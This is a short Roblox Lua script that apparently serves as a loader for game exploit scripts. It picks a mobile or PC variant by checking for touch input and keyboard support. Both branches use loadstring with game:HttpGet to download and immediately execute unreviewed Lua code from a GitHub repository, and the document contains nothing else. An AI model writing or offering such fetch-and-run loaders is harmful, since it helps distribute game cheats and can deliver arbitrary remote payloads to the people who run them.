local UserInputService = game:GetService("UserInputService")

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/forgeing548/dl/refs/heads/main/Streetmob.lua"))()
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/forgeing548/dl/refs/heads/main/Streetlifepc.lua"))()
end
